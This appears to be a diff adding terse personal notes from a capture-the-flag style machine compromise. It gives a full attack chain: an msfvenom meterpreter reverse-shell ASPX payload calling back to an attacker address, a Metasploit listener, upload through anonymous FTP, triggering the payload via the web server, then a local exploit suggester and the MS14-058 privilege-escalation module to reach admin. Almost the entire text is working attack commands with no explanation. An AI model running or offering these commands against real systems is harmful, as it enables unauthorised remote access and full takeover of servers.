@@ -1,0 +1,10 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=1234 -f aspx -o shell.aspx
+use exploit multi/handler	//set payload, lhost, lport
+ftp 10.10.10.5
+anonymous:anonymous
+put shell.aspx
+//go to site 10.10.10.5/shell.aspx and got user shell y metasploit
+
+use multi/recon/local_exploit_suggester		//set session
+use windows/local/ms14_058_track_popup_menu	//set session, lhost
+shell						//got admin
